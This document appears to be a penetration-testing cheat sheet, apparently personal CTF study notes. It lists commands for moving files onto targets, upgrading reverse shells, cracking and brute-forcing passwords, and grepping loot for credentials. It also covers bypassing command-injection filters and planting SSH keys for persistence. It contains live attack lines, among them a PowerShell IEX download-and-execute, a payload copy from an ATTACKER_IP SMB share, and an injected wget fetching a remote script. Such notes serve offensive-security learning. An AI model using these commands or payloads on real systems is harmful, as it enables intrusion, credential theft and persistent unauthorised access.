---
description: GOTTA STICK TO THE BASICS LAHH
---

# Fundamentals

## File Transfer

#### Python HTTP Server

`sudo python3 -m http.server 80`

#### Netcat&#x20;

```
nc -vl [port] > file [receiver]
nc -N [receiver_IP] [receiver_port] < file [sender]
cat [file] | nc [receiver_IP] [receiver_port] - Alternative
```

#### SCP

`scp [-r] <local_path> $user@$ip:/<remote_path> [Upload local to remote]`

`scp [-r] $user@$ip:/<remote_path> <local_path> [Download remote to local]`&#x20;

#### Powershell

{% code fullWidth="true" %}
```
powershell (New-Object System.Net.WebClient).DownloadFile('http://IP/file', 'file')
download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE')
Invoke-WebRequest http://domain.tld/script.ps1 -OutFile C:\Windows\Tasks\script.ps1
```
{% endcode %}

#### Certutil

```
certutil -urlcache -f [path_to_file] [file_name]
```

#### SMB

```
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
net use \\ATTACKER_IP\share /del
```

## Upgrading Reverse Shell&#x20;

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

Ctrl-Z
# In Kali
stty raw -echo
stty size
fg

#In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
$stty rows <num> columns <cols>

/usr/bin/script -qc /bin/bash /dev/null

SOCAT
```

## Password Cracking

```
[file_ext]2john
john [--format=lm] --wordlist=/usr/share/wordlists/rockyou.txt [hash.txt]
unshadow /etc/passwd /etc/shadow > output.db

hydra [-L [userlist.txt] -P [passwordlist.txt]]/[-C [combineduserpassfile]] [IP] http[s]-post-form "/[endpoint]:log=^USER^&pwd=^PASS^[rest of POST body if exist]:F=[error message]"
-C uses file in [user:pass] format and reduces the number of combinations and reduces bruteforce time, eg. retrieve username passwords from a db

.\hashcat64.exe -m [mode] hash.txt rockyou.txt -d 1
```

{% embed url="https://github.com/stealthsploit/OneRuleToRuleThemStill" %}

{% embed url="https://kevinovitz.github.io/TryHackMe_Writeups/passwordattacks/passwordattacks/#online-password-attacks" %}

## Looting

```
cat userlist.txt | tr ' ' '\n' | grep . [Replaces all whitespaces between values with newlines]
grep -r password . 2>/dev/null [searches for the value 'password' recursively across all files]
cut -d "delimiter" -f (field number 1,2 etc.) file.txt
```

## Bypass Character Filters

```
${IFS} - Internal Field Separator, default variable in bash

0xdf;{ping,-c,1,10.10.14.23};#
0xdf;ping -c 1 10.10.14.23;#

#Quotes was also not URL encoded
password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
%0a : \n
%09 : \t
```

## Pivoting & Port Forwarding

{% embed url="https://github.com/twelvesec/port-forwarding" %}

{% embed url="https://www.ivoidwarranties.tech/posts/pentesting-tuts/pivoting/proxychains/" %}

{% embed url="https://theyhack.me/Proxychains-Double-Pivoting/" %}

{% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}

## Git

```
https://github.com/arthaud/git-dumper
git status
git diff --cached [file]
git show <hash> [in logs]
git restore [file]
git log
git checkout [hash]
```

### SSH Keys

Every revshell as an actual user -> this is the play

```
KALI
ssh-keygen -t rsa
chmod 700 ~/.ssh; chmod 600 ~/.ssh/id_rsa [kali]

REMOTE
/home/user/.ssh$ echo "[id_rsa.pub value]" > authorized_keys
chmod 700 .ssh; chmod 700 .ssh/authorized_keys
```
